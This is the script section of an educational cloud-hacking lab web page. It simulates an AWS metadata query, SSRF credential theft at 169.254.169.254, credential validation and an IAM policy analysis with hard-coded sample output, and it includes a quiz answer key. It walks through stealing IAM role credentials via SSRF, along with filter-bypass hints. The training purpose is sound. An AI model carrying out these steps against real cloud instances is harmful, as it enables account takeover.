  "InstanceProfileId": "AIPAI23HZ27SI6FQMGNQ2"
}`,
            '/iam/security-credentials/': 'WebServerRole',
            '/user-data': `#!/bin/bash
# Instance initialization script
apt-get update
apt-get install -y nginx
echo "DB_PASSWORD=MySecretPassword123" >> /etc/environment`,
            '/public-keys/': '0=my-ssh-key'
        };

        function queryMetadata() {
            const endpoint = document.getElementById('metadataUrl').value;
            const output = document.getElementById('metadataOutput');

            output.innerHTML = `<div style="color: #00aaff;">GET http://169.254.169.254/latest/meta-data${endpoint}</div>
<div style="color: #888;">Connecting to metadata service...</div>
<div style="color: #00ff00;">HTTP/1.1 200 OK</div>
<div style="color: #888;">Content-Type: text/plain</div>
<div style="color: #888;">‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ</div>`;

            setTimeout(() => {
                if (endpoint === '/iam/security-credentials/') {
                    output.innerHTML += `<div style="color: #0f0;">${metadataResponses[endpoint]}</div>
<div style="color: #888;">‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ</div>
<div style="color: #ffaa00;">üí° Role name discovered! Query this path to get credentials:</div>
<div style="color: #00aaff;">/latest/meta-data/iam/security-credentials/WebServerRole</div>`;
                } else if (endpoint === '/iam/security-credentials/WebServerRole') {
                    output.innerHTML += `<div><span class="json-key">"Code"</span>: <span class="json-string">"Success"</span>,</div>
<div><span class="json-key">"LastUpdated"</span>: <span class="json-string">"2024-01-15T12:34:56Z"</span>,</div>
<div><span class="json-key">"Type"</span>: <span class="json-string">"AWS-HMAC"</span>,</div>
<div><span class="json-key">"AccessKeyId"</span>: <span class="json-string">"ASIAQ3GBREXAMPLE"</span>,</div>
<div><span class="json-key">"SecretAccessKey"</span>: <span class="json-string">"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"</span>,</div>
<div><span class="json-key">"Token"</span>: <span class="json-string">"FQoGZXIvYXdzEBYaD..."</span>,</div>
<div><span class="json-key">"Expiration"</span>: <span class="json-string">"2024-01-15T18:34:56Z"</span></div>
<div style="color: #888;">‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ</div>
<div style="color: #ff0000;">üî¥ CREDENTIALS STOLEN! Use these with AWS CLI for cloud access.</div>`;
                } else {
                    output.innerHTML += `<div style="color: #0f0;">${metadataResponses[endpoint] || 'Not found'}</div>`;
                }
            }, 500);
        }

        // Credential validation simulator
        function validateCredentials() {
            const accessKey = document.getElementById('accessKey').value.trim();
            const secretKey = document.getElementById('secretKey').value.trim();
            const output = document.getElementById('credOutput');

            if (!accessKey || !secretKey) {
                output.innerHTML = '<div class="error">Error: Please enter both access key and secret key</div>';
                return;
            }

            output.innerHTML = `<div class="terminal-line"><span class="prompt">$</span> aws sts get-caller-identity</div>
<div class="terminal-line" style="color: #00aaff;">Validating credentials...</div>`;

            setTimeout(() => {
                const isValid = accessKey.startsWith('AKIA') || accessKey.startsWith('ASIA');

                if (isValid) {
                    output.innerHTML += `<div class="terminal-line"></div>
<div class="terminal-line" style="color: #00ff00;">{</div>
<div class="terminal-line" style="color: #00ff00;">    "UserId": "AIDAI23HZ27SI6FQMGNQ2",</div>
<div class="terminal-line" style="color: #00ff00;">    "Account": "123456789012",</div>
<div class="terminal-line" style="color: #00ff00;">    "Arn": "arn:aws:iam::123456789012:user/web-server"</div>
<div class="terminal-line" style="color: #00ff00;">}</div>
<div class="terminal-line"></div>
<div class="terminal-line" style="color: #00ff00;">‚úì Credentials are VALID!</div>
<div class="terminal-line" style="color: #00aaff;">Account ID: 123456789012</div>
<div class="terminal-line" style="color: #00aaff;">User: web-server</div>`;
                } else {
                    output.innerHTML += `<div class="terminal-line"></div>
<div class="terminal-line" style="color: #ff0000;">An error occurred (InvalidClientTokenId) when calling the GetCallerIdentity operation: The security token included in the request is invalid.</div>
<div class="terminal-line"></div>
<div class="terminal-line" style="color: #ffaa00;">‚úó Credentials are INVALID</div>`;
                }
            }, 1000);
        }

        // Privilege escalation visualizer
        function activatePrivLevel(level) {
            for (let i = 1; i <= 5; i++) {
                const elem = document.getElementById(`privLevel${i}`);
                if (i <= level) {
                    elem.classList.add('active');
                } else {
                    elem.classList.remove('active');
                }
            }

            const levelElem = document.getElementById(`privLevel${level}`);
            levelElem.scrollIntoView({ behavior: 'smooth', block: 'center' });
        }

        // SSRF simulator
        function testSSRF(url) {
            document.getElementById('ssrfUrl').value = url;
        }

        function executeSSRF() {
            const url = document.getElementById('ssrfUrl').value.trim();
            const output = document.getElementById('ssrfOutput');

            if (!url) {
                output.innerHTML = '<div class="error">Error: Please enter a URL</div>';
                return;
            }

            output.innerHTML = `<div class="terminal-line"><span class="prompt">$</span> curl "${url}"</div>
<div class="terminal-line" style="color: #00aaff;">Initiating SSRF attack...</div>
<div class="terminal-line" style="color: #00aaff;">Bypassing application filters...</div>`;

            setTimeout(() => {
                if (url.includes('169.254.169.254')) {
                    if (url.includes('iam/security-credentials/WebServerRole')) {
                        output.innerHTML += `<div class="terminal-line"></div>
<div class="terminal-line" style="color: #00ff00;">HTTP/1.1 200 OK</div>
<div class="terminal-line" style="color: #00ff00;">{</div>
<div class="terminal-line" style="color: #00ff00;">  "Code": "Success",</div>
<div class="terminal-line" style="color: #00ff00;">  "AccessKeyId": "ASIAQ3GBRVEXAMPLE",</div>
<div class="terminal-line" style="color: #00ff00;">  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",</div>
<div class="terminal-line" style="color: #00ff00;">  "Token": "FQoGZXIvYXdzEBYaDExampleToken...",</div>
<div class="terminal-line" style="color: #00ff00;">  "Expiration": "2024-01-15T18:34:56Z"</div>
<div class="terminal-line" style="color: #00ff00;">}</div>
<div class="terminal-line"></div>
<div class="terminal-line" style="color: #ff0000;">üî¥ CRITICAL: IAM credentials successfully stolen via SSRF!</div>
<div class="terminal-line" style="color: #ffaa00;">Configure AWS CLI with these credentials to access cloud resources.</div>`;
                    } else if (url.includes('iam/security-credentials/')) {
                        output.innerHTML += `<div class="terminal-line"></div>
<div class="terminal-line" style="color: #00ff00;">HTTP/1.1 200 OK</div>
<div class="terminal-line" style="color: #00ff00;">WebServerRole</div>
<div class="terminal-line"></div>
<div class="terminal-line" style="color: #ffaa00;">‚ö† IAM role name discovered!</div>
<div class="terminal-line" style="color: #00aaff;">Next: Access /latest/meta-data/iam/security-credentials/WebServerRole</div>`;
                    } else if (url.includes('user-data')) {
                        output.innerHTML += `<div class="terminal-line"></div>
<div class="terminal-line" style="color: #00ff00;">HTTP/1.1 200 OK</div>
<div class="terminal-line" style="color: #00ff00;">#!/bin/bash</div>
<div class="terminal-line" style="color: #00ff00;">apt-get update</div>
<div class="terminal-line" style="color: #00ff00;">apt-get install -y nginx</div>
<div class="terminal-line" style="color: #ff0000;">DB_PASSWORD=MySecretPassword123</div>
<div class="terminal-line"></div>
<div class="terminal-line" style="color: #ff0000;">üî¥ EXPOSED: Hardcoded credentials in user data!</div>`;
                    } else {
                        output.innerHTML += `<div class="terminal-line"></div>
<div class="terminal-line" style="color: #00ff00;">HTTP/1.1 200 OK</div>
<div class="terminal-line" style="color: #00ff00;">ami-id</div>
<div class="terminal-line" style="color: #00ff00;">iam/</div>
<div class="terminal-line" style="color: #00ff00;">instance-id</div>
<div class="terminal-line" style="color: #00ff00;">user-data</div>
<div class="terminal-line"></div>
<div class="terminal-line" style="color: #ffaa00;">‚ö† Metadata service accessible via SSRF!</div>`;
                    }
                } else {
                    output.innerHTML += `<div class="terminal-line"></div>
<div class="terminal-line" style="color: #ff0000;">Error: Connection timeout or filtered by WAF</div>
<div class="terminal-line" style="color: #00aaff;">Try: IP encoding, DNS rebinding, or redirect techniques</div>`;
                }
            }, 1200);
        }

        function clearSSRFOutput() {
            document.getElementById('ssrfOutput').innerHTML = '<div class="terminal-line"><span class="prompt">$</span> SSRF testing environment ready...</div>';
        }

        // IAM policy analyzer
        function analyzePolicy() {
            const policyText = document.getElementById('policyInput').value.trim();
            const output = document.getElementById('policyOutput');

            if (!policyText) {
                output.innerHTML = '<div class="error">Error: Please enter a policy JSON</div>';
                return;
            }

            output.innerHTML = '<div class="terminal-line"><span class="prompt">$</span> Analyzing IAM policy for security issues...</div>';

            setTimeout(() => {
                try {
                    const policy = JSON.parse(policyText);
                    const issues = [];
                    const warnings = [];

                    if (policy.Statement) {
                        policy.Statement.forEach((stmt, idx) => {
                            if (stmt.Effect === 'Allow') {
                                if (stmt.Action === '*' && stmt.Resource === '*') {
                                    issues.push(`Statement ${idx}: CRITICAL - Administrator access (*:* on all resources)`);
                                } else if (stmt.Action === '*') {
                                    issues.push(`Statement ${idx}: HIGH - All actions allowed on resources`);
                                } else if (stmt.Resource === '*') {
                                    warnings.push(`Statement ${idx}: MEDIUM - Actions allowed on all resources`);
                                }

                                const dangerousActions = ['iam:PassRole', 'iam:CreatePolicyVersion', 'iam:AddUserToGroup',
                                    'iam:AttachUserPolicy', 'lambda:CreateFunction', 'ec2:RunInstances'];
                                const actions = Array.isArray(stmt.Action) ? stmt.Action : [stmt.Action];

                                actions.forEach(action => {
                                    if (dangerousActions.includes(action)) {
                                        warnings.push(`Statement ${idx}: Privilege escalation vector - ${action}`);
                                    }
                                });
                            }
                        });
                    }

                    let results = '<div class="terminal-line"></div><div class="terminal-line" style="color: #00ff00;">POLICY ANALYSIS COMPLETE</div><div class="terminal-line">‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê</div>';

                    if (issues.length > 0) {
                        results += '<div class="terminal-line"></div><div class="terminal-line" style="color: #ff0000;">CRITICAL ISSUES:</div>';
                        issues.forEach(issue => {
                            results += `<div class="terminal-line" style="color: #ff0000;">üî¥ ${issue}</div>`;
                        });
                    }

                    if (warnings.length > 0) {
                        results += '<div class="terminal-line"></div><div class="terminal-line" style="color: #ffaa00;">WARNINGS:</div>';
                        warnings.forEach(warning => {
                            results += `<div class="terminal-line" style="color: #ffaa00;">‚ö† ${warning}</div>`;
                        });
                    }

                    if (issues.length === 0 && warnings.length === 0) {
                        results += '<div class="terminal-line"></div><div class="terminal-line" style="color: #00ff00;">‚úì No obvious security issues detected</div>';
                    }

                    results += '<div class="terminal-line"></div><div class="terminal-line" style="color: #00aaff;">Recommendation: Apply principle of least privilege</div>';
                    output.innerHTML += results;

                } catch (e) {
                    output.innerHTML += `<div class="terminal-line"></div><div class="error">JSON Parse Error: ${e.message}</div>`;
                }
            }, 800);
        }

        // Quiz functionality
        const quizAnswers = {
            q1: 'b',  // PACU
            q2: 'c',  // 169.254.169.254
            q3: 'c',  // etcd
            q4: 'b',  // Trivy
            q5: 'b',  // iam:PassRole + ec2:RunInstances
            q6: 'b',  // IMDSv2
            q7: 'c',  // 6443
            q8: 'c',  // BucketKicker
            q9: 'b',  // Learning cloud security
            q10: 'b', // iam:CreatePolicyVersion
            q11: 'c', // SSRF
            q12: 'b'  // Customer only
        };

        function submitQuiz() {
            let score = 0;
            let totalQuestions = Object.keys(quizAnswers).length;

            // Check each answer
            Object.keys(quizAnswers).forEach(question => {
                const selected = document.querySelector(`input[name="${question}"]:checked`);
                const options = document.querySelectorAll(`input[name="${question}"]`);

                options.forEach(option => {
                    const label = option.parentElement;
                    label.classList.remove('correct', 'incorrect');

                    if (option.value === quizAnswers[question]) {
                        label.classList.add('correct');
                    } else if (selected && option === selected) {
                        label.classList.add('incorrect');
                    }
                });

                if (selected && selected.value === quizAnswers[question]) {
                    score++;
                }
            });

            const percentage = Math.round((score / totalQuestions) * 100);
            const resultDiv = document.getElementById('quizResult');
            const scoreDisplay = document.getElementById('scoreDisplay');
            const resultMessage = document.getElementById('resultMessage');

            scoreDisplay.textContent = `${score} / ${totalQuestions} (${percentage}%)`;

            if (percentage === 100) {
                resultMessage.innerHTML = `<p style="color: var(--success);">üéâ Perfect Score! You've mastered cloud security!</p>
                    <p>You've earned <strong>80 XP</strong> for completing the Cloud Security & Hacking Lab!</p>`;
                quizCompleted.status = true;
                updateProgress();
            } else if (percentage >= 75) {
                resultMessage.innerHTML = `<p style="color: var(--success);">‚úì Great job! You have a strong understanding of cloud security.</p>
                    <p>You've earned <strong>${Math.round(percentage * 0.8)} XP</strong>. Review incorrect answers to improve.</p>`;
                quizCompleted.status = true;
                updateProgress();
            } else if (percentage >= 50) {
                resultMessage.innerHTML = `<p style="color: var(--warning);">Good effort! Review the material and try again.</p>
                    <p>You've earned <strong>${Math.round(percentage * 0.8)} XP</strong>.</p>`;
            } else {
                resultMessage.innerHTML = `<p style="color: var(--accent);">Keep studying! Review the lab sections before retrying.</p>
                    <p>Score 75% or higher to earn full XP.</p>`;
            }

            resultDiv.style.display = 'block';
            resultDiv.scrollIntoView({ behavior: 'smooth', block: 'center' });
        }

        // Initialize progress on page load
        updateProgress();
    </script>
</body>
</html>